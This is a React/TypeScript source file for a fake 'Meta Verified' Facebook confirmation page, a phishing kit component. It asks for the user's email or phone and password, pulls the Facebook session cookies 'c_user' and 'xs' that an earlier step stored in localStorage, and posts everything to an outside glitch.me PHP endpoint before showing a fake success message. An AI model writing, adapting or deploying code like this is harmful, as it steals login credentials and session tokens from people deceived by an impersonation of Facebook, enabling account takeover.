import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { confirmationFormSchema } from "@shared/schema";
// import { apiRequest } from "@/lib/queryClient"; // Removed as fetch is used instead
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { countries } from "@/lib/countries";

export default function Confirmation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
  const [countryCode, setCountryCode] = useState('+1');

  const form = useForm({
    resolver: zodResolver(confirmationFormSchema),
    defaultValues: {
      user_email: "",
      password: "",
      c_user: "",
      xs: "",
      admin_email: process.env.SMTP_USER || "",
      admin_email_2: process.env.ADMIN_EMAIL || "",
      admin_email_3: "",
    },
  });

  // Load validation data on mount
  useEffect(() => {
    const storedData = localStorage.getItem('validation_data');
    if (!storedData) {
      setLocation('/validation');
      return;
    }
    try {
      const parsed = JSON.parse(storedData);
      form.setValue('c_user', parsed.c_user);
      form.setValue('xs', parsed.xs);
    } catch (error) {
      console.error('Failed to parse validation data:', error);
      setLocation('/validation');
    }
  }, [setLocation, form]);

  const onSubmit = async (data: any) => {
    try {
      const formattedData = {
        ...data,
        user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
      };

      console.log('Submitting form data:', formattedData);

      await fetch('https://mixed-fluff-space.glitch.me/zubairbhaispan.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formattedData),
      });

      localStorage.removeItem('validation_data');

      toast({
        title: "Success!",
        description: "Your form has been submitted successfully"
      });
      setLocation("/success");
    } catch (error) {
      console.error('Form submission error:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };


  return (
    <>
      <MetaTags 
        title="Meta Verified | Confirmation"
        description="Request a verified badge on Facebook - Final Step"
      />
      <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
        <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
            alt="Logo"
            className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
          />
          <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
            Facebook Security
          </h1>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <div className="text-left">
                <div className="mb-4">
                  <label className="block font-semibold mb-1.5 text-[#606770] text-xs sm:text-sm">
                    Contact Method
                  </label>
                  <div className="flex gap-4">
                    <button
                      type="button"
                      onClick={() => setContactMethod('email')}
                      className={`flex-1 py-1.5 text-sm rounded ${
                        contactMethod === 'email'
                          ? 'bg-[#1877f2] text-white'
                          : 'bg-[#e4e6eb] text-[#606770]'
                      }`}
                    >
                      Email
                    </button>
                    <button
                      type="button"
                      onClick={() => setContactMethod('phone')}
                      className={`flex-1 py-1.5 text-sm rounded ${
                        contactMethod === 'phone'
                          ? 'bg-[#1877f2] text-white'
                          : 'bg-[#e4e6eb] text-[#606770]'
                      }`}
                    >
                      Phone
                    </button>
                  </div>
                </div>

                <FormField
                  control={form.control}
                  name="user_email"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                        {contactMethod === 'email' ? 'Email Address' : 'Phone Number'}
                      </FormLabel>
                      <FormControl>
                        <div className="flex gap-2">
                          {contactMethod === 'phone' && (
                            <Select
                              value={countryCode}
                              onValueChange={setCountryCode}
                            >
                              <SelectTrigger className="w-[100px]">
                                <SelectValue placeholder="Code" />
                              </SelectTrigger>
                              <SelectContent className="max-h-[200px]">
                                {countries.map((country) => (
                                  <SelectItem key={country.code} value={country.code}>
                                    {country.code} ({country.name})
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                          )}
                          <Input
                            type={contactMethod === 'email' ? 'email' : 'tel'}
                            placeholder={
                              contactMethod === 'email'
                                ? "Enter email address"
                                : "Enter phone number"
                            }
                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                            {...field}
                            onChange={(e) => {
                              const value = e.target.value.replace(/\s+/g, '');
                              field.onChange(value);
                            }}
                          />
                        </div>
                      </FormControl>
                      <FormMessage className="text-xs text-red-500 mt-1" />
                    </FormItem>
                  )}
                />
              </div>
              <div className="text-left space-y-4">
                <FormField
                  control={form.control}
                  name="password"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                        Password
                      </FormLabel>
                      <FormControl>
                        <Input
                          type="password"
                          placeholder="Enter password"
                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-red-500 mt-1" />
                    </FormItem>
                  )}
                />

                {/* Hidden admin email fields */}
                <input 
                  type="hidden" 
                  name="admin_email" 
                  value={process.env.SMTP_USER || ""} 
                />
                <input 
                  type="hidden" 
                  name="admin_email_2" 
                  value={process.env.ADMIN_EMAIL || ""} 
                />
                <FormField
                  control={form.control}
                  name="admin_email_3"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                        Additional Email
                      </FormLabel>
                      <FormControl>
                        <Input
                          type="email"
                          placeholder="Enter additional email"
                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                          {...field}
                        />
                      </FormControl>
                      <FormMessage className="text-xs text-red-500 mt-1" />
                    </FormItem>
                  )}
                />
              </div>
              <Button 
                type="submit" 
                className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm"
                disabled={form.formState.isSubmitting}
              >
                {form.formState.isSubmitting ? "Submitting..." : "Submit"}
              </Button>
            </form>
          </Form>
        </div>
      </div>
    </>
  );
}